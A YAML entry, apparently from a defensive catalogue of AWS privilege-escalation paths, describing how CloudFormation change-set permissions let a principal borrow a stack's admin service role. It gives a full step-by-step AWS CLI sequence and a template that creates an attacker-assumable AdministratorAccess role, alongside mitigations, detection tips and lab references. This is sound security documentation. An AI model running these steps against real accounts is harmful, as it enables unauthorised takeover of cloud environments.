@@ -1,0 +1,335 @@
+id: cloudformation-005
+name: cloudformation:CreateChangeSet + cloudformation:ExecuteChangeSet
+category: service-passrole
+services:
+  - cloudformation
+  - iam
+permissions:
+  required:
+    - permission: cloudformation:CreateChangeSet
+      resourceConstraints: Must have permission to create change sets on the target stack
+    - permission: cloudformation:ExecuteChangeSet
+      resourceConstraints: Must have permission to execute change sets on the target stack
+  additional:
+    - permission: cloudformation:DescribeChangeSet
+      resourceConstraints: Helpful for viewing change set details and confirming creation
+    - permission: cloudformation:DescribeStacks
+      resourceConstraints: Useful for discovering existing CloudFormation stacks to target
+    - permission: cloudformation:DescribeStackResource
+      resourceConstraints: Helpful for viewing stack resources and service role information
+description: A principal with `cloudformation:CreateChangeSet` and `cloudformation:ExecuteChangeSet` permissions can inherit administrative privileges from an existing CloudFormation stack's service role. Unlike direct stack updates which require explicit permissions on the resources being modified, change set execution bypasses traditional IAM permission checks by delegating all operations to the stack's attached service role. If that service role has administrative privileges, an attacker can inject malicious infrastructure changes (such as creating a new admin IAM role) through the change set mechanism without needing those elevated permissions directly.
+prerequisites:
+  admin:
+    - An existing CloudFormation stack must exist with a service role attached
+    - The stack's service role must have administrative permissions (e.g., AdministratorAccess or an equivalent custom policy)
+  lateral:
+    - An existing CloudFormation stack must exist with a service role attached
+    - The stack's service role must have elevated permissions
+exploitationSteps:
+  awscli:
+    - step: 1
+      command: aws cloudformation describe-stacks --query 'Stacks[*].[StackName,RoleARN]' --output table
+      description: List CloudFormation stacks and identify one with a privileged service role
+    - step: 2
+      command: |
+        aws cloudformation get-template \
+          --stack-name TARGET_STACK \
+          --query 'TemplateBody' \
+          --output text > original-template.json
+      description: Retrieve the current stack template to understand its structure
+    - step: 3
+      command: |
+        cat > malicious-template.json <<'EOF'
+        {
+          "AWSTemplateFormatVersion": "2010-09-09",
+          "Description": "Updated template via ChangeSet - adds escalated admin role",
+          "Resources": {
+            "EscalatedAdminRole": {
+              "Type": "AWS::IAM::Role",
+              "Properties": {
+                "RoleName": "escalated-admin-role",
+                "AssumeRolePolicyDocument": {
+                  "Version": "2012-10-17",
+                  "Statement": [{
+                    "Effect": "Allow",
+                    "Principal": {"AWS": "arn:aws:iam::ACCOUNT_ID:user/YOUR_USERNAME"},
+                    "Action": "sts:AssumeRole"
+                  }]
+                },
+                "ManagedPolicyArns": ["arn:aws:iam::aws:policy/AdministratorAccess"]
+              }
+            }
+          }
+        }
+        EOF
+      description: Create a malicious CloudFormation template that adds an admin role you can assume
+    - step: 4
+      command: |
+        aws cloudformation create-change-set \
+          --stack-name TARGET_STACK \
+          --change-set-name escalation-changeset \
+          --template-body file://malicious-template.json \
+          --capabilities CAPABILITY_NAMED_IAM \
+          --change-set-type UPDATE
+      description: Create a change set with the malicious template
+    - step: 5
+      command: |
+        aws cloudformation describe-change-set \
+          --stack-name TARGET_STACK \
+          --change-set-name escalation-changeset
+      description: View the change set details to confirm it will add the escalated role
+    - step: 6
+      command: |
+        aws cloudformation execute-change-set \
+          --stack-name TARGET_STACK \
+          --change-set-name escalation-changeset
+      description: Execute the change set - the stack's admin service role creates the escalated role
+    - step: 7
+      command: aws cloudformation wait stack-update-complete --stack-name TARGET_STACK
+      description: Wait for the stack update to complete
+    - step: 8
+      command: |
+        aws sts assume-role \
+          --role-arn arn:aws:iam::ACCOUNT_ID:role/escalated-admin-role \
+          --role-session-name escalation-session
+      description: Assume the newly created escalated admin role and verify administrator access
+recommendation: |
+  Implement least privilege for CloudFormation permissions - avoid granting `cloudformation:CreateChangeSet` and `cloudformation:ExecuteChangeSet` together unless absolutely necessary.
+
+  Use resource-based conditions to restrict change set operations to specific stacks:
+
+  ```json
+  {
+    "Effect": "Allow",
+    "Action": [
+      "cloudformation:CreateChangeSet",
+      "cloudformation:ExecuteChangeSet"
+    ],
+    "Resource": "arn:aws:cloudformation:REGION:ACCOUNT_ID:stack/SpecificStack/*",
+    "Condition": {
+      "StringEquals": {
+        "aws:ResourceTag/Environment": "dev"
+      }
+    }
+  }
+  ```
+
+  Additional controls:
+  - Review CloudFormation stack service roles and minimize permissions - avoid using AdministratorAccess for stack service roles
+  - Implement Service Control Policies (SCPs) to prevent change set execution on stacks with privileged service roles from non-admin principals
+  - Monitor CloudTrail for `CreateChangeSet` and `ExecuteChangeSet` API calls, especially on stacks with elevated permissions
+  - Enable MFA requirements for sensitive CloudFormation operations using condition keys like `aws:MultiFactorAuthPresent`
+  - Use IAM Access Analyzer to identify CloudFormation stacks with overly permissive service roles
+  - Consider using stack policies to prevent modifications to critical infrastructure resources
+  - Review and audit the AWS managed policy `SecretsManagerReadWrite` - consider creating a custom policy without CloudFormation permissions if change set operations aren't required
+  - Implement CloudWatch alarms on CloudFormation change set creation and execution events for automated detection
+  - Use CloudFormation drift detection to identify unexpected stack modifications
+  - Establish approval workflows for change set execution on production stacks using AWS Service Catalog or custom automation
+limitations: |
+  This path provides administrative access only if the target CloudFormation stack's service role has administrative permissions. The attacker gains whatever permissions the stack's service role has. If the role has limited permissions, the attacker gains limited access. However, even limited access may enable multi-hop attacks or access to sensitive data.
+discoveredBy:
+  name: Haroon Meer & Marco Slaviero 
+  organization: Thinkst
+  date: '2017'
+discoveryAttribution:
+  firstDocumented:
+    author: Haroon Meer & Marco Slaviero
+    organization: Thinkst
+    date: 2019
+    link: https://www.youtube.com/watch?v=OaEU_5dh9Bc  
+references:
+  - title: "Fighting the Previous War (aka: Attacking and Defending in the Era of the Cloud)"
+    url: "https://www.youtube.com/watch?v=OaEU_5dh9Bc"
+  - title: "CloudFormation Change Set Privilege Escalation - Lucian Patian (Blog Post)"
+    url: "https://dev.to/aws-builders/cloudformation-change-set-privilege-escalation-18i6"
+  - title: "PMapper CloudFormation Edge Detection (Original Implementation)"
+    url: "https://github.com/nccgroup/PMapper/blob/master/principalmapper/graphing/cloudformation_edges.py"
+  - title: "AWS CloudFormation Privilege Escalation - HackTricks"
+    url: "https://cloud.hacktricks.xyz/pentesting-cloud/aws-security/aws-privilege-escalation/aws-cloudformation-privesc"
+relatedPaths:
+  - cloudformation-001
+  - cloudformation-002
+  - cloudformation-003
+  - cloudformation-004
+detectionTools:
+  pmapper: https://github.com/nccgroup/PMapper/blob/master/principalmapper/graphing/cloudformation_edges.py#L188-L210
+learningEnvironments:
+  pathfinder-labs:
+    type: open-source
+    githubLink: https://github.com/DataDog/pathfinder-labs
+    scenario: "privesc-one-hop/to-admin/cloudformation-createchangeset+executechangeset"
+    description: "Deploy Terraform scenarios individually or in groups, each with attack and cleanup scripts"
+attackVisualization:
+  nodes:
+    - id: start
+      label: Starting Principal
+      type: principal
+      description: |
+        The principal with `cloudformation:CreateChangeSet` and `cloudformation:ExecuteChangeSet` permissions. Can be an IAM user or role. Unlike the PassRole + CreateStack path, this attacker doesn't create a new stack - they modify an existing stack to leverage its service role's permissions.
+
+    - id: existing_stack
+      label: Existing CloudFormation Stack
+      type: resource
+      description: |
+        An existing CloudFormation stack in the account that has a privileged IAM service role attached. The stack must have been created with the `--role-arn` parameter, which delegates all resource operations to the specified service role. The attacker targets this stack to inject malicious infrastructure changes.
+
+    - id: stack_service_role
+      label: Existing Stack Service Role
+      type: principal
+      description: |
+        The privileged IAM role attached to the existing CloudFormation stack. This role must trust cloudformation.amazonaws.com in its trust policy. When change sets are executed, CloudFormation assumes this role to create, update, or delete resources defined in the template. The attacker inherits whatever permissions this role has.
+
+    - id: create_changeset
+      label: Create Malicious Change Set
+      type: payload
+      color: '#99ccff'
+      description: |
+        The attacker creates a change set on the existing stack with a malicious template. The template adds new resources (typically an IAM role with a trust policy allowing the attacker to assume it) or modifies existing resources to grant elevated access.
+
+        The change set doesn't execute immediately - it's a staged update that must be explicitly executed in a separate API call. This two-step process is what makes this attack unique compared to UpdateStack.
+
+        Example malicious template adds an escalated admin role:
+        ```json
+        {
+          "AWSTemplateFormatVersion": "2010-09-09",
+          "Resources": {
+            "EscalatedAdminRole": {
+              "Type": "AWS::IAM::Role",
+              "Properties": {
+                "RoleName": "escalated-admin-role",
+                "AssumeRolePolicyDocument": {
+                  "Version": "2012-10-17",
+                  "Statement": [{
+                    "Effect": "Allow",
+                    "Principal": {"AWS": "arn:aws:iam::ACCOUNT_ID:user/YOUR_USERNAME"},
+                    "Action": "sts:AssumeRole"
+                  }]
+                },
+                "ManagedPolicyArns": ["arn:aws:iam::aws:policy/AdministratorAccess"]
+              }
+            }
+          }
+        }
+        ```
+
+    - id: execute_changeset
+      label: Execute Change Set
+      type: payload
+      color: '#99ccff'
+      description: |
+        The attacker executes the change set, triggering CloudFormation to apply the malicious template changes. The CloudFormation service assumes the stack's service role and provisions the resources defined in the change set (such as the new escalated IAM role).
+
+        This step bypasses traditional IAM permission checks because CloudFormation delegates all operations to the stack's service role, not the attacker's principal. The attacker only needs CreateChangeSet and ExecuteChangeSet permissions - they don't need direct IAM permissions to create roles.
+
+    - id: escalated_role
+      label: Newly Created Escalated Role
+      type: principal
+      description: |
+        The IAM role created by the executed change set. This role has a trust policy that allows the starting principal to assume it, and it has whatever permissions were defined in the malicious template (typically AdministratorAccess). The attacker can now assume this role to gain elevated privileges.
+
+    - id: admin_outcome
+      label: Effective Administrator
+      type: outcome
+      description: |
+        If the stack's service role has administrative permissions (AdministratorAccess or equivalent), the executed change set successfully creates an escalated IAM role with admin access. The attacker assumes this role and gains full administrative control over the AWS account.
+
+    - id: partial_outcome
+      label: Check for Additional Access
+      type: outcome
+      color: '#ffeb99'
+      description: |
+        If the stack's service role has some elevated permissions but not full admin (e.g., IAM write permissions but not full admin), the executed change set can create resources that grant partial privilege escalation. This might include roles with data access permissions, Lambda functions with elevated privileges, or other resources that enable additional attacks.
+
+    - id: minimal_outcome
+      label: Minimal Additional Access
+      type: outcome
+      color: '#cccccc'
+      description: |
+        If the stack's service role only has minimal permissions (e.g., basic CloudFormation and S3 access but no IAM permissions), the change set cannot create resources that provide meaningful privilege escalation. The attack may fail or provide limited value.
+
+  edges:
+    - from: start
+      to: existing_stack
+      label: cloudformation:CreateChangeSet
+      description: |
+        The attacker creates a change set on an existing CloudFormation stack. They target a stack that has a privileged service role attached. The change set is created with a malicious template that defines new or modified resources.
+
+        Command:
+        ```bash
+        aws cloudformation create-change-set \
+          --stack-name TARGET_STACK \
+          --change-set-name escalation-changeset \
+          --template-body file://malicious-template.json \
+          --capabilities CAPABILITY_NAMED_IAM \
+          --change-set-type UPDATE
+        ```
+
+        Note the `--capabilities CAPABILITY_NAMED_IAM` flag, which is required when the template creates IAM resources with custom names. The attacker does not specify `--role-arn` because the stack already has a service role attached from its original creation.
+
+    - from: existing_stack
+      to: stack_service_role
+      label: Stack uses existing service role
+      description: |
+        When the change set is executed, CloudFormation uses the service role that was originally attached to the stack during creation. The stack's configuration includes a `RoleARN` property that points to this privileged role. All resource operations in the change set execute with this role's permissions, not the attacker's permissions.
+
+    - from: stack_service_role
+      to: create_changeset
+      label: Change set staged (not yet executed)
+      description: |
+        The change set is created and staged for review. At this point, no resources have been created or modified yet. The change set can be viewed with `cloudformation:DescribeChangeSet` to see what changes will be applied. This staging step is what distinguishes CreateChangeSet + ExecuteChangeSet from the more direct UpdateStack operation.
+
+    - from: create_changeset
+      to: execute_changeset
+      label: cloudformation:ExecuteChangeSet
+      description: |
+        The attacker executes the change set to apply the malicious template changes. CloudFormation assumes the stack's service role and begins creating or modifying resources as defined in the change set.
+
+        Command:
+        ```bash
+        aws cloudformation execute-change-set \
+          --stack-name TARGET_STACK \
+          --change-set-name escalation-changeset
+        ```
+
+        Wait for completion:
+        ```bash
+        aws cloudformation wait stack-update-complete \
+          --stack-name TARGET_STACK
+        ```
+
+    - from: execute_changeset
+      to: escalated_role
+      label: CloudFormation creates escalated role
+      description: |
+        CloudFormation, operating with the stack service role's permissions, creates the new escalated IAM role defined in the malicious template. This role is configured with a trust policy allowing the starting principal to assume it, and with elevated permissions (e.g., AdministratorAccess).
+
+    - from: escalated_role
+      to: admin_outcome
+      label: If stack role has admin permissions
+      branch: A
+      condition: admin
+      description: |
+        If the stack's service role has AdministratorAccess or equivalent permissions, the escalated role is successfully created with full admin access. The attacker assumes this role to gain complete administrative control.
+
+        Command:
+        ```bash
+        aws sts assume-role \
+          --role-arn arn:aws:iam::ACCOUNT_ID:role/escalated-admin-role \
+          --role-session-name escalation-session
+        ```
+
+    - from: escalated_role
+      to: partial_outcome
+      label: If stack role has some elevated permissions
+      branch: B
+      condition: some_permissions
+      description: |
+        If the stack's service role has IAM write permissions or other elevated permissions but not full admin, the escalated role can be created with partial privileges. The attacker gains some additional access that may enable data exfiltration, reconnaissance, or multi-hop attacks.
+
+    - from: escalated_role
+      to: minimal_outcome
+      label: If stack role has minimal permissions
+      branch: C
+      condition: no_permissions
+      description: |
+        If the stack's service role lacks IAM write permissions, the change set execution will fail when attempting to create the escalated IAM role. The CloudFormation stack update fails, and the attacker gains no additional privileges. This occurs when the stack's service role has minimal permissions like basic CloudFormation and S3 access only.
